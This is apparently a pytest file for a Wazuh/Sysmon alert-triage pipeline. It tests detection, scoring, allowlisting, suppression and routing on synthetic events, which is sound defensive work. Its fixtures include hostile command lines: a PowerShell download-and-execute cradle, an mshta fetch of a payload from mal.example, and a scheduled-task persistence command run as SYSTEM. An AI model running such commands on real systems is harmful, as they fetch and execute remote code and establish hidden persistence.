from datetime import UTC, datetime, timedelta

from wazuh_sysmon_triage.models.sysmon import NetworkConnectEvent, ProcessCreateEvent
from wazuh_sysmon_triage.pipeline.detect import (
    detect_alerts,
    filter_alerts,
    is_allowlisted_image,
    run_detection,
)


def test_powershell_scoring_caps_at_100() -> None:
    event = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, 0, 0, 0, tzinfo=UTC),
        agent_id="999",
        agent_name="agent-test",
        process_guid="{PS}",
        process_id=200,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line=(
            "powershell.exe -enc aaa -nop -w hidden "
            "IEX (New-Object Net.WebClient).DownloadString('http://x') "
            "[Convert]::FromBase64String('QQ==')"
        ),
        user="HOST\\user",
    )

    alerts = detect_alerts([event])
    assert len(alerts) == 1
    alert = alerts[0]
    assert alert.alert_type == "powershell_obfuscation"
    assert alert.score == 95
    assert alert.category == "malware_execution"
    assert alert.queue == "soc_malware"
    assert "encoded command" in alert.reason


def test_powershell_encoding_parameter_does_not_trigger_obfuscation() -> None:
    event = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, 0, 0, 0, tzinfo=UTC),
        agent_id="999",
        agent_name="agent-test",
        process_guid="{PS-NO-ENC}",
        process_id=201,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line=(
            "powershell.exe -Command "
            "\"$x='ok'; $x | Out-File -FilePath C:\\Temp\\ok.txt -Encoding UTF8\""
        ),
        user="HOST\\user",
    )

    alerts = detect_alerts([event])
    assert all(alert.alert_type != "powershell_obfuscation" for alert in alerts)


def test_lolbin_and_path_outbound_enriches_command_line_from_eid1() -> None:
    process = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, 0, 0, 0, tzinfo=UTC),
        agent_id="999",
        agent_name="agent-test",
        process_guid="{LOLBIN}",
        process_id=300,
        image="C:\\Users\\user\\AppData\\Roaming\\mshta.exe",
        command_line="mshta.exe http://mal.example/payload.hta",
        parent_image="C:\\Windows\\explorer.exe",
        user="HOST\\user",
    )
    outbound = NetworkConnectEvent(
        event_id=3,
        timestamp=datetime(2024, 1, 1, 0, 0, 5, tzinfo=UTC),
        agent_id="999",
        agent_name="agent-test",
        process_guid="{LOLBIN}",
        process_id=300,
        image="C:\\Users\\user\\AppData\\Roaming\\mshta.exe",
        destination_ip="8.8.8.8",
        destination_port=443,
        protocol="tcp",
    )

    alerts = detect_alerts([process, outbound])
    types = {alert.alert_type for alert in alerts}
    assert "lolbin_outbound" in types
    assert "suspicious_path_outbound" in types

    lolbin = next(alert for alert in alerts if alert.alert_type == "lolbin_outbound")
    assert lolbin.score == 90
    assert lolbin.command_line == "mshta.exe http://mal.example/payload.hta"
    assert lolbin.parent_image == "C:\\Windows\\explorer.exe"

    path = next(alert for alert in alerts if alert.alert_type == "suspicious_path_outbound")
    assert path.score == 80


def test_beacon_like_outbound_detection() -> None:
    process = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, 0, 0, 0, tzinfo=UTC),
        agent_id="999",
        agent_name="agent-test",
        process_guid="{BEACON}",
        process_id=601,
        image="C:\\Windows\\Temp\\agent.exe",
        command_line="agent.exe --sync",
        parent_image="C:\\Windows\\explorer.exe",
        user="HOST\\user",
    )
    outbound_events = [
        NetworkConnectEvent(
            event_id=3,
            timestamp=process.timestamp + timedelta(seconds=60 * idx),
            agent_id="999",
            agent_name="agent-test",
            process_guid="{BEACON}",
            process_id=601,
            image="C:\\Windows\\Temp\\agent.exe",
            destination_ip="8.8.8.8",
            destination_port=443,
            protocol="tcp",
        )
        for idx in range(4)
    ]

    alerts = detect_alerts([process, *outbound_events])
    beacon = next(alert for alert in alerts if alert.alert_type == "beacon_like_outbound")
    assert beacon.queue == "soc_malware"
    assert beacon.category == "c2_outbound"
    assert beacon.destination_ip == "8.8.8.8"
    assert beacon.destination_port == 443
    assert "Beacon-like outbound pattern" in beacon.reason
    assert beacon.routing_why


def test_schtasks_rule_and_threshold_filter() -> None:
    event = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, 1, 0, 0, tzinfo=UTC),
        agent_id="999",
        agent_name="agent-test",
        process_guid="{TASK}",
        process_id=400,
        image="C:\\Windows\\System32\\schtasks.exe",
        command_line=(
            "schtasks.exe /Create /TN Updater9A4D2F11 /TR "
            "\"powershell -nop -w hidden -File C:\\Users\\user\\AppData\\Local\\Temp\\u.ps1\" "
            "/RU SYSTEM /RL HIGHEST"
        ),
        user="HOST\\user",
    )
    alerts = detect_alerts([event])

    assert len(alerts) == 1
    assert alerts[0].alert_type == "persistence_schtasks_create"
    assert alerts[0].score == 100

    filtered = filter_alerts(alerts, min_score=101)
    assert filtered == []


def test_allowlisted_images_are_suppressed() -> None:
    assert is_allowlisted_image("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe")

    event = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, 0, 0, 0, tzinfo=UTC),
        agent_id="999",
        agent_name="agent-test",
        process_guid="{ALLOW}",
        process_id=111,
        image="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        command_line="chrome.exe -enc aQBlAHgA",
        user="HOST\\user",
    )
    alerts = detect_alerts([event])
    assert alerts == []

    result = run_detection([event])
    assert result.suppressed_events == 1
    assert result.suppression_hits.get("allowlist:chrome.exe") == 1


def test_custom_allowlist_override() -> None:
    event = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, 0, 0, 0, tzinfo=UTC),
        agent_id="999",
        agent_name="agent-test",
        process_guid="{OVR}",
        process_id=211,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -enc aQBlAHgA",
        user="HOST\\user",
    )
    alerts = detect_alerts([event], allowlist_basenames=["powershell.exe"])
    assert alerts == []


def test_rule_suppression_and_override() -> None:
    event = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, 0, 0, 0, tzinfo=UTC),
        agent_id="999",
        agent_name="agent-test",
        process_guid="{SUP}",
        process_id=777,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -enc aQBlAHgA",
        user="HOST\\svc-trusted",
    )

    suppression = [{"name": "trusted_ps", "image_glob": "*powershell.exe", "user": "HOST\\svc-trusted"}]
    suppressed = run_detection([event], suppression_rules=suppression)
    assert suppressed.alerts == []
    assert suppressed.suppressed_alerts == 1
    assert suppressed.suppression_hits == {"trusted_ps": 1}

    override = [{"name": "keep_ps", "image_glob": "*powershell.exe", "user": "HOST\\svc-trusted"}]
    unsuppressed = run_detection(
        [event],
        suppression_rules=suppression,
        allowlist_override_rules=override,
    )
    assert len(unsuppressed.alerts) == 1
    assert unsuppressed.suppressed_alerts == 0


def test_context_role_routes_dev_tooling_to_soc_dev() -> None:
    event = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, 0, 0, 0, tzinfo=UTC),
        agent_id="999",
        agent_name="dev-laptop",
        process_guid="{DEV}",
        process_id=123,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -NoLogo -NoProfile -Command Start-EditorServices",
        user="HOST\\alice",
    )

    result = run_detection(
        [event],
        context_roles={
            "developer": {
                "agent_names": ["dev-laptop"],
            }
        },
    )
    assert len(result.alerts) >= 1
    alert = next(item for item in result.alerts if item.alert_type == "powershell_dev_tooling")
    assert alert.alert_type == "powershell_dev_tooling"
    assert alert.queue == "soc_dev"
    assert alert.category == "developer_tooling"
    assert alert.score <= 15
    assert "role:developer" in alert.tags


def test_advanced_injection_escalates_with_public_non_ms_outbound() -> None:
    process = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, 0, 0, 0, tzinfo=UTC),
        agent_id="999",
        agent_name="agent-test",
        process_guid="{ADV}",
        process_id=987,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe [System.Reflection.Emit.AssemblyBuilderAccess]::Run DefineDynamicAssembly",
        user="HOST\\user",
    )
    outbound = NetworkConnectEvent(
        event_id=3,
        timestamp=datetime(2024, 1, 1, 0, 0, 5, tzinfo=UTC),
        agent_id="999",
        agent_name="agent-test",
        process_guid="{ADV}",
        process_id=987,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        destination_ip="8.8.8.8",
        destination_port=443,
        protocol="tcp",
    )

    alerts = detect_alerts([process, outbound])
    advanced = next(alert for alert in alerts if alert.alert_type == "powershell_advanced_injection")
    assert advanced.category == "malware_execution"
    assert advanced.queue == "soc_malware"
    assert advanced.confidence == "high"
    assert advanced.score >= 80


def test_dedup_keeps_distinct_minute_buckets() -> None:
    first = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, 0, 0, 5, tzinfo=UTC),
        agent_id="999",
        agent_name="agent-test",
        process_guid="{PS-LONG}",
        process_id=300,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -enc aQBlAHgA",
        user="HOST\\user",
    )
    second = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, 0, 2, 5, tzinfo=UTC),
        agent_id="999",
        agent_name="agent-test",
        process_guid="{PS-LONG}",
        process_id=300,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -enc aQBlAHgA",
        user="HOST\\user",
    )

    alerts = detect_alerts([first, second])
    powershell_alerts = [alert for alert in alerts if alert.alert_type == "powershell_obfuscation"]
    assert len(powershell_alerts) == 2


def test_burst_fanout_and_hot_host_meta_alert() -> None:
    base_ts = datetime(2024, 1, 1, 2, 0, 0, tzinfo=UTC)
    process_events = [
        ProcessCreateEvent(
            event_id=1,
            timestamp=base_ts + timedelta(seconds=12 * idx),
            agent_id="999",
            agent_name="agent-test",
            process_guid=f"{{BURST-{idx}}}",
            process_id=700 + idx,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line="powershell.exe -enc aQBlAHgA",
            user="HOST\\user",
        )
        for idx in range(6)
    ]

    alerts = detect_alerts(process_events)
    types = {alert.alert_type for alert in alerts}
    assert "burst_suspicious_processes" in types
    assert "executive_hot_host" in types
    burst = next(alert for alert in alerts if alert.alert_type == "burst_suspicious_processes")
    assert burst.routing_why
